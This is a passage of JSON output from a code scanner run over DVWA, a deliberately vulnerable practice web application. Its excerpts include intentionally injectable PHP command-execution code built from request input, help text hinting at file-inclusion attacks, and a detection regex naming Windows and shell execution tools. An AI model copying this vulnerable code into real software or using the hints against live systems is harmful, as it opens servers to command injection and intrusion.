        "excerpt": "\n\t\t&lt;h3&gt;High Level&lt;/h3&gt;\n\t\t&lt;p&gt;The developer has had enough. They decided to only allow certain files to be used. However as there are multiple files with the same basename,\n\t\t\tthey use a wildcard to include them all.&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;LFI: The filename only has start with a certain value.&lt;/span&gt;.\n\t\t\tSpoiler: &lt;span class=&quot;spoiler&quot;&gt;RFI: Need to link in another vulnerability, such as file upload&lt;/span&gt;.&lt;/pre&gt;\n\n\t\t&lt;br /&gt;\n\n",
        "startLocationLine": 45,
        "startLocationColumn": 27,
        "endLocationLine": 45,
        "endLocationColumn": 49
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/fi/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "hack",
        "excerpt": "\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n\t\t&lt;p&gt;Read all &lt;u&gt;five&lt;/u&gt; famous quotes from &#39;&lt;a href=&quot;../hackable/flags/fi.php&quot;&gt;../hackable/flags/fi.php&lt;/a&gt;&#39; using only the file inclusion.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;This allows for direct input into &lt;u&gt;one of many PHP functions&lt;/u&gt; that will include the content when executing.&lt;/p&gt;\n",
        "startLocationLine": 23,
        "startLocationColumn": 59,
        "endLocationLine": 23,
        "endLocationColumn": 63
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/fi/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "hack",
        "excerpt": "\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n\t\t&lt;p&gt;Read all &lt;u&gt;five&lt;/u&gt; famous quotes from &#39;&lt;a href=&quot;../hackable/flags/fi.php&quot;&gt;../hackable/flags/fi.php&lt;/a&gt;&#39; using only the file inclusion.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;This allows for direct input into &lt;u&gt;one of many PHP functions&lt;/u&gt; that will include the content when executing.&lt;/p&gt;\n",
        "startLocationLine": 23,
        "startLocationColumn": 85,
        "endLocationLine": 23,
        "endLocationColumn": 89
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/help/help.php",
        "ruleId": "AI029200",
        "ruleName": "Platform: Microsoft Windows",
        "ruleDescription": "Platform: Microsoft Windows",
        "pattern": "windows",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.Platform.OS.Microsoft.WindowsStandard"
        ],
        "sample": "Windows",
        "excerpt": "\t\t&lt;p&gt;Command injection attacks are possible in most cases because of lack of correct input data validation, which can be manipulated by the attacker\n\t\t\t(forms, cookies, HTTP headers etc.).&lt;/p&gt;\n\n\t\t&lt;p&gt;The syntax and commands may differ between the Operating Systems (OS), such as Linux and Windows, depending on their desired actions.&lt;/p&gt;\n\n\t\t&lt;p&gt;This attack may also be called &quot;Remote Command Execution (RCE)&quot;.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n",
        "startLocationLine": 16,
        "startLocationColumn": 95,
        "endLocationLine": 16,
        "endLocationColumn": 102
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/help/help.php",
        "ruleId": "AI029500",
        "ruleName": "Platform: Linux",
        "ruleDescription": "Platform: Linux",
        "pattern": "\\b(linux|xubuntu|ubuntu|coreos|manjaro|archlinux|debian|mint|gentoo|opensuse|redhat|mandrake|mandriva|slackware)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.Platform.OS.Linux.Distro"
        ],
        "sample": "Linux",
        "excerpt": "\t\t&lt;p&gt;Command injection attacks are possible in most cases because of lack of correct input data validation, which can be manipulated by the attacker\n\t\t\t(forms, cookies, HTTP headers etc.).&lt;/p&gt;\n\n\t\t&lt;p&gt;The syntax and commands may differ between the Operating Systems (OS), such as Linux and Windows, depending on their desired actions.&lt;/p&gt;\n\n\t\t&lt;p&gt;This attack may also be called &quot;Remote Command Execution (RCE)&quot;.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n",
        "startLocationLine": 16,
        "startLocationColumn": 85,
        "endLocationLine": 16,
        "endLocationColumn": 90
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/help/help.php",
        "ruleId": "AI040600",
        "ruleName": "Authorization: General",
        "ruleDescription": "Authorization: General",
        "pattern": "authorize|authorized|authorization|isauthorized",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authorization.General"
        ],
        "sample": "authorize",
        "excerpt": "\t\t&lt;h3&gt;About&lt;/h3&gt;\n\t\t&lt;p&gt;The purpose of the command injection attack is to inject and execute commands specified by the attacker in the vulnerable application.\n\t\t\tIn situation like this, the application, which executes unwanted system commands, is like a pseudo system shell, and the attacker may use it\n\t\t\tas any authorized system user. However, commands are executed with the same privileges and environment as the web service has.&lt;/p&gt;\n\n\t\t&lt;p&gt;Command injection attacks are possible in most cases because of lack of correct input data validation, which can be manipulated by the attacker\n\t\t\t(forms, cookies, HTTP headers etc.).&lt;/p&gt;\n\n\t\t&lt;p&gt;The syntax and commands may differ between the Operating Systems (OS), such as Linux and Windows, depending on their desired actions.&lt;/p&gt;\n",
        "startLocationLine": 11,
        "startLocationColumn": 11,
        "endLocationLine": 11,
        "endLocationColumn": 20
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/high.php",
        "ruleId": "AI029200",
        "ruleName": "Platform: Microsoft Windows",
        "ruleDescription": "Platform: Microsoft Windows",
        "pattern": "windows",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.Platform.OS.Microsoft.WindowsStandard"
        ],
        "sample": "Windows",
        "excerpt": "\t$target = str_replace( array_keys( $substitutions ), $substitutions, $target );\n\n\t// Determine OS and execute the ping command.\n\tif( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {\n\t\t// Windows\n\t\t$cmd = shell_exec( &#39;ping  &#39; . $target );\n\t}\n\telse {\n\t\t// *nix\n",
        "startLocationLine": 24,
        "startLocationColumn": 34,
        "endLocationLine": 24,
        "endLocationColumn": 41
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/high.php",
        "ruleId": "AI029200",
        "ruleName": "Platform: Microsoft Windows",
        "ruleDescription": "Platform: Microsoft Windows",
        "pattern": "windows",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.Platform.OS.Microsoft.WindowsStandard"
        ],
        "sample": "Windows",
        "excerpt": "\n\t// Determine OS and execute the ping command.\n\tif( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {\n\t\t// Windows\n\t\t$cmd = shell_exec( &#39;ping  &#39; . $target );\n\t}\n\telse {\n\t\t// *nix\n\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n",
        "startLocationLine": 25,
        "startLocationColumn": 6,
        "endLocationLine": 25,
        "endLocationColumn": 13
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/high.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t// Determine OS and execute the ping command.\n\tif( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {\n\t\t// Windows\n\t\t$cmd = shell_exec( &#39;ping  &#39; . $target );\n\t}\n\telse {\n\t\t// *nix\n\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t}\n",
        "startLocationLine": 26,
        "startLocationColumn": 4,
        "endLocationLine": 26,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/high.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t}\n\telse {\n\t\t// *nix\n\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t}\n\n\t// Feedback for the end user\n\t$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;\n}\n",
        "startLocationLine": 30,
        "startLocationColumn": 4,
        "endLocationLine": 30,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/high.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t}\n\n\t// Feedback for the end user\n\t$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;\n}\n\n?&gt;\n\n",
        "startLocationLine": 34,
        "startLocationColumn": 19,
        "endLocationLine": 34,
        "endLocationColumn": 22
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/impossible.php",
        "ruleId": "AI029200",
        "ruleName": "Platform: Microsoft Windows",
        "ruleDescription": "Platform: Microsoft Windows",
        "pattern": "windows",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.Platform.OS.Microsoft.WindowsStandard"
        ],
        "sample": "Windows",
        "excerpt": "\t\t$target = $octet[0] . &#39;.&#39; . $octet[1] . &#39;.&#39; . $octet[2] . &#39;.&#39; . $octet[3];\n\n\t\t// Determine OS and execute the ping command.\n\t\tif( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {\n\t\t\t// Windows\n\t\t\t$cmd = shell_exec( &#39;ping  &#39; . $target );\n\t\t}\n\t\telse {\n\t\t\t// *nix\n",
        "startLocationLine": 20,
        "startLocationColumn": 35,
        "endLocationLine": 20,
        "endLocationColumn": 42
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/impossible.php",
        "ruleId": "AI029200",
        "ruleName": "Platform: Microsoft Windows",
        "ruleDescription": "Platform: Microsoft Windows",
        "pattern": "windows",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.Platform.OS.Microsoft.WindowsStandard"
        ],
        "sample": "Windows",
        "excerpt": "\n\t\t// Determine OS and execute the ping command.\n\t\tif( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {\n\t\t\t// Windows\n\t\t\t$cmd = shell_exec( &#39;ping  &#39; . $target );\n\t\t}\n\t\telse {\n\t\t\t// *nix\n\t\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n",
        "startLocationLine": 21,
        "startLocationColumn": 7,
        "endLocationLine": 21,
        "endLocationColumn": 14
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/impossible.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t\t// Determine OS and execute the ping command.\n\t\tif( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {\n\t\t\t// Windows\n\t\t\t$cmd = shell_exec( &#39;ping  &#39; . $target );\n\t\t}\n\t\telse {\n\t\t\t// *nix\n\t\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t\t}\n",
        "startLocationLine": 22,
        "startLocationColumn": 5,
        "endLocationLine": 22,
        "endLocationColumn": 8
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/impossible.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t\t}\n\t\telse {\n\t\t\t// *nix\n\t\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t\t}\n\n\t\t// Feedback for the end user\n\t\t$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 26,
        "startLocationColumn": 5,
        "endLocationLine": 26,
        "endLocationColumn": 8
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/impossible.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t\t}\n\n\t\t// Feedback for the end user\n\t\t$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;\n\t}\n\telse {\n\t\t// Ops. Let the user name theres a mistake\n\t\t$html .= &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#39;;\n\t}\n",
        "startLocationLine": 30,
        "startLocationColumn": 20,
        "endLocationLine": 30,
        "endLocationColumn": 23
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/medium.php",
        "ruleId": "AI029200",
        "ruleName": "Platform: Microsoft Windows",
        "ruleDescription": "Platform: Microsoft Windows",
        "pattern": "windows",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.Platform.OS.Microsoft.WindowsStandard"
        ],
        "sample": "Windows",
        "excerpt": "\t$target = str_replace( array_keys( $substitutions ), $substitutions, $target );\n\n\t// Determine OS and execute the ping command.\n\tif( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {\n\t\t// Windows\n\t\t$cmd = shell_exec( &#39;ping  &#39; . $target );\n\t}\n\telse {\n\t\t// *nix\n",
        "startLocationLine": 17,
        "startLocationColumn": 34,
        "endLocationLine": 17,
        "endLocationColumn": 41
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/medium.php",
        "ruleId": "AI029200",
        "ruleName": "Platform: Microsoft Windows",
        "ruleDescription": "Platform: Microsoft Windows",
        "pattern": "windows",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.Platform.OS.Microsoft.WindowsStandard"
        ],
        "sample": "Windows",
        "excerpt": "\n\t// Determine OS and execute the ping command.\n\tif( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {\n\t\t// Windows\n\t\t$cmd = shell_exec( &#39;ping  &#39; . $target );\n\t}\n\telse {\n\t\t// *nix\n\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n",
        "startLocationLine": 18,
        "startLocationColumn": 6,
        "endLocationLine": 18,
        "endLocationColumn": 13
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/medium.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t// Determine OS and execute the ping command.\n\tif( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {\n\t\t// Windows\n\t\t$cmd = shell_exec( &#39;ping  &#39; . $target );\n\t}\n\telse {\n\t\t// *nix\n\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t}\n",
        "startLocationLine": 19,
        "startLocationColumn": 4,
        "endLocationLine": 19,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/medium.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t}\n\telse {\n\t\t// *nix\n\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t}\n\n\t// Feedback for the end user\n\t$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;\n}\n",
        "startLocationLine": 23,
        "startLocationColumn": 4,
        "endLocationLine": 23,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/medium.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t}\n\n\t// Feedback for the end user\n\t$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;\n}\n\n?&gt;\n\n",
        "startLocationLine": 27,
        "startLocationColumn": 19,
        "endLocationLine": 27,
        "endLocationColumn": 22
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/low.php",
        "ruleId": "AI029200",
        "ruleName": "Platform: Microsoft Windows",
        "ruleDescription": "Platform: Microsoft Windows",
        "pattern": "windows",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.Platform.OS.Microsoft.WindowsStandard"
        ],
        "sample": "Windows",
        "excerpt": "\t$target = $_REQUEST[ &#39;ip&#39; ];\n\n\t// Determine OS and execute the ping command.\n\tif( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {\n\t\t// Windows\n\t\t$cmd = shell_exec( &#39;ping  &#39; . $target );\n\t}\n\telse {\n\t\t// *nix\n",
        "startLocationLine": 8,
        "startLocationColumn": 34,
        "endLocationLine": 8,
        "endLocationColumn": 41
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/low.php",
        "ruleId": "AI029200",
        "ruleName": "Platform: Microsoft Windows",
        "ruleDescription": "Platform: Microsoft Windows",
        "pattern": "windows",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.Platform.OS.Microsoft.WindowsStandard"
        ],
        "sample": "Windows",
        "excerpt": "\n\t// Determine OS and execute the ping command.\n\tif( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {\n\t\t// Windows\n\t\t$cmd = shell_exec( &#39;ping  &#39; . $target );\n\t}\n\telse {\n\t\t// *nix\n\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n",
        "startLocationLine": 9,
        "startLocationColumn": 6,
        "endLocationLine": 9,
        "endLocationColumn": 13
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/low.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t// Determine OS and execute the ping command.\n\tif( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {\n\t\t// Windows\n\t\t$cmd = shell_exec( &#39;ping  &#39; . $target );\n\t}\n\telse {\n\t\t// *nix\n\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t}\n",
        "startLocationLine": 10,
        "startLocationColumn": 4,
        "endLocationLine": 10,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/low.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t}\n\telse {\n\t\t// *nix\n\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t}\n\n\t// Feedback for the end user\n\t$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;\n}\n",
        "startLocationLine": 14,
        "startLocationColumn": 4,
        "endLocationLine": 14,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/low.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t}\n\n\t// Feedback for the end user\n\t$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;\n}\n\n?&gt;\n\n",
        "startLocationLine": 18,
        "startLocationColumn": 19,
        "endLocationLine": 18,
        "endLocationColumn": 22
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/weak_id/help/help.php",
        "ruleId": "AI027400",
        "ruleName": "Hygiene: Fix Comment",
        "ruleDescription": "Hygiene: Fix Comment",
        "pattern": "fixme|broke|broken",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Fix"
        ],
        "sample": "Broke",
        "excerpt": "\n\t&lt;/div&gt;\n\n\t&lt;p&gt;Reference: &lt;?php echo dvwaExternalLinkUrlGet( &#39;https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management&#39; ); ?&gt;&lt;/p&gt;\n&lt;/div&gt;\n\n",
        "startLocationLine": 38,
        "startLocationColumn": 99,
        "endLocationLine": 38,
        "endLocationColumn": 104
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/weak_id/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "passwords",
        "excerpt": "\t&lt;tr&gt;\n\t&lt;td&gt;&lt;div id=&quot;code&quot;&gt;\n\t\t&lt;h3&gt;About&lt;/h3&gt;\n\t\t&lt;p&gt;Knowledge of a session ID is often the only thing required to access a site as a specific user after they have logged in, if that session ID is able to be calculated or easily guessed, then an attacker will have an easy way to gain access to user accounts without having to brute force passwords or find other vulnerabilities such as Cross-Site Scripting.&lt;/p&gt;\n\n\t\t&lt;p&gt;&lt;hr /&gt;&lt;/p&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n\t\t&lt;p&gt;This module uses four different ways to set the dvwaSession cookie value, the objective of each level is to work out how the ID is generated and then infer the IDs of other system users.&lt;/p&gt;\n",
        "startLocationLine": 9,
        "startLocationColumn": 292,
        "endLocationLine": 9,
        "endLocationColumn": 301
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/weak_id/source/high.php",
